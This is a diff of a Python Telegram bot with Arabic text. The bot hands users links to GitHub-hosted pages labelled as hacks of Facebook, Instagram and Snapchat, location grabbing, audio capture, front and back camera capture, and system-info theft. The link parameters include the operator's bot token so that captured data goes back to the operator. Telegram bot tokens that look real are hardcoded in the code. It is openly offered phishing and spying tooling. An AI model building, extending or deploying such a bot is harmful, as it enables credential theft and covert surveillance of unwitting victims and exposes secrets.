@@ -1,120 +1,85 @@
 import telebot
 from telebot import types
-import requests
-from flask import Flask
-from threading import Thread
-import os
 import time
 
-# 1. إعداد السيرفر لضمان بقاء البوت متصلاً 24/7
-app = Flask('')
-@app.route('/')
-def home(): return "M.Y.9 Full System Online - Dev: Abu Osayed"
+# --- الإعدادات الأساسية (M.Y.9) ---
+API_TOKEN = '8151523455:AAHrG3jEolK9P3Gid6q8Qe79hM9pA-OooyU' 
+ADMIN_ID = '7238206121' # أبو أسيد Malkawi
+GITHUB_URL = "https://m-y-9-tech.github.io/" 
 
-def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
-def keep_alive(): Thread(target=run).start()
+bot = telebot.TeleBot(API_TOKEN)
 
-# 2. الإعدادات الأساسية (تم تحديث التوكن الجديد هنا ✅)
-TOKEN = '8669513520:AAEiDFYnz8IF_45a2pUiThpNtNGarPCooyU'
-ADMIN_ID = '7238206121' 
-bot = telebot.TeleBot(TOKEN)
-
-# دالة اختصار الروابط
-def short(url):
-    try:
-        r = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
-        return r.text if r.status_code == 200 else url
-    except: return url
-
-# 3. معالج أمر البداية /start
 @bot.message_handler(commands=['start'])
-def start(m):
-    uid, name = m.chat.id, m.from_user.first_name
+def welcome(message):
+    chat_id = message.chat.id
     
-    # رسالة التنبيه الأولية (عربي)
-    alert_text = f"""
-أبو أسيد للمعلومات 🦅
-⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
-
-عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـضـمـان تـفـعـيـل الـنـظـام يـجـب مـتـابـعـة حـسـاب المـطـور الـرسمـي عـلى انـسـتـغـرام.
-
-📢 تـنـبـيـه الـمـطـور (Abu Osayed Malkawi):
-الـرجـاء الانـتـظـار لـمـدة (2 دقـيـقـة) حـتـى يـتـم تـأكـيـد مـتـابـعـتـك لـلـحـساب وتـولـيـد الـروابـط تـلـقـائـيـاً 💀🔥
-    """
+    # رسالة التنبيه الأولية بالزخرفة المطلوبة
+    welcome_text = (
+        "أبو أسيد للمعلومات 🦅\n"
+        "⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:\n\n"
+        "عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـضـمـان تـفـعـيـل الـنـظـام يـجـب مـتـابـعـة حـساب المـطـور الـرسمـي عـلى انـسـتـغـرام."
+    )
     
-    markup = types.InlineKeyboardMarkup()
-    btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور عـلى انـسـتـغـرام", url="https://www.instagram.com/m_y_.9/")
-    markup.add(btn_insta)
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    # أسماء الروابط مزخرفة "اختراق" كما طلبت وبالترتيب
+    btns = [
+        types.InlineKeyboardButton("🔹 اخـتـراق فـيـس بـوك", callback_data="fb"),
+        types.InlineKeyboardButton("🔸 اخـتـراق انـسـتـغـرام", callback_data="ig"),
+        types.InlineKeyboardButton("👻 اخـتـراق سـنـاب شـات", callback_data="sn"),
+        types.InlineKeyboardButton("📍 سـحـب الـمـوقـع", callback_data="lc"),
+        types.InlineKeyboardButton("💻 اخـتـراق مـعـلـومـات", callback_data="sys"),
+        types.InlineKeyboardButton("🎤 اخـتـراق صـوت", callback_data="au"),
+        types.InlineKeyboardButton("🤳 كـمـرة أمـامـيـة", callback_data="c1"),
+        types.InlineKeyboardButton("📷 كـمـرة خـلـفـيـة", callback_data="c2")
+    ]
+    markup.add(*btns)
+    markup.add(types.InlineKeyboardButton("📢 متابعة المطور (Instagram)", url="https://www.instagram.com/abu_osayed_malkawi"))
     
-    bot.send_message(uid, alert_text, reply_markup=markup)
+    bot.send_message(chat_id, welcome_text, reply_markup=markup)
 
-    # دالة المعالجة في الخلفية (انتظار 120 ثانية ثم توليد الروابط)
-    def background_process(user_chat_id, user_name):
-        time.sleep(120) 
-        
-        h = user_name.replace(" ", "_")
-        base = "https://m-y-9-tech.github.io/fb/"
-        params = f"?user_id={user_chat_id}&admin_id={ADMIN_ID}&hunter={h}&bot_token={TOKEN}"
-        
-        # القائمة الكاملة للـ 8 روابط الاحترافية
-        lnks = {
-            "fb": short(base+"fb.html"+params),
-            "ig": short(base+"ig.html"+params),
-            "sn": short(base+"sn.html"+params),
-            "lc": short(base+"loc.html"+params),
-            "sys": short(base+"sys.html"+params),
-            "au": short(base+"audio.html"+params),
-            "c1": short(base+"c1.html"+params),
-            "c2": short(base+"c2.html"+params)
-        }
+@bot.callback_query_handler(func=lambda call: True)
+def handle_links(call):
+    chat_id = call.message.chat.id
+    data = call.data
+    
+    # رسالة الانتظار دقيقتين (التمويه الصارم)
+    wait_text = (
+        "أبو أسيد للمعلومات 🦅\n"
+        "📢 تـنـبـيـه الـمـطـور (Abu Osayed Malkawi):\n\n"
+        "الـرجـاء الانـتـظـار لـمـدة (2 دقـيـقـة) حـتـى يـتـم تـأكـيـد مـتـابـعـتـك لـلـحـساب وتـولـيـد الـروابـط تـلـقـائـيـاً 💀🔥"
+    )
+    
+    bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=wait_text)
+    
+    # الانتظار الإجباري 120 ثانية
+    time.sleep(120) 
 
-        # الرسالة النهائية المزخرفة
-        final_msg = f"""
-أبو أسيد للمعلومات 🦅
-🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق بـنـجـاح ✅
+    params = f"?admin_id={ADMIN_ID}&user_id={chat_id}&bot_token={API_TOKEN}"
+    files = {
+        "fb": "fb.html", "ig": "ig.html", "sn": "sn.html",
+        "lc": "loc.html", "sys": "sys.html", "au": "audio.html",
+        "c1": "c1.html", "c2": "c2.html"
+    }
+    
+    final_link = GITHUB_URL + files[data] + params
+    
+    # الرسالة النهائية المزخرفة مع المسافات بين الروابط
+    result_text = (
+        "أبو أسيد للمعلومات 🦅\n"
+        "🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق بـنـجـاح ✅\n\n"
+        "👤 Developer: 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚\n\n"
+        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
+        f"🔗 الرابط المزخرف جاهز للاستخدام:\n\n"
+        f"{final_link}\n\n"
+        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\n"
+        "⚖️ إخـلاء مـسـؤولـيـة: الـمـطـور (Abu Osayed Malkawi) غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.\n\n"
+        "▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
+        "⚙️ Status: Connected Successfully"
+    )
+    
+    bot.send_message(chat_id, result_text)
+    bot.send_message(ADMIN_ID, f"🔔 تم توليد رابط {data} بنجاح.")
 
-👤 Developer: 𝔸𝕓𝕦 𝕆𝕤𝕒𝕪𝕖𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
-
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-
-🔹 اخـتـراق فـيـس بـوك: 
-🔗 {lnks['fb']}
-
-🔸 اخـتـراق انـسـتـغـرام: 
-🔗 {lnks['ig']}
-
-👻 اخـتـراق سـنـاب شـات: 
-🔗 {lnks['sn']}
-
-📍 سـحـب الـمـوقـع: 
-🔗 {lnks['lc']}
-
-🎤 سـحـب الـصـوت: 
-🔗 {lnks['au']}
-
-🤳 كـمـرة أمـامـيـة: 
-🔗 {lnks['c1']}
-
-📷 كـمـرة خـلـفـيـة: 
-🔗 {lnks['c2']}
-
-💻 سـحـب الـنـظـام:
-🔗 {lnks['sys']}
-
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚖️ إخـلاء مـسـؤولـيـة: الـمـطـور (Abu Osayed Malkawi) غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚙️ Status: Connected Successfully
-        """
-        bot.send_message(user_chat_id, final_msg, parse_mode="Markdown", disable_web_page_preview=True)
-
-    # تشغيل عملية الانتظار في خيط منفصل (Thread)
-    Thread(target=background_process, args=(uid, name)).start()
-
-# 4. تشغيل البوت مع تنظيف الاتصال
 if __name__ == "__main__":
-    keep_alive()
     bot.remove_webhook()
-    time.sleep(2)
-    print("🚀 M.Y.9 System is Online with New Token!")
     bot.infinity_polling(skip_pending=True)
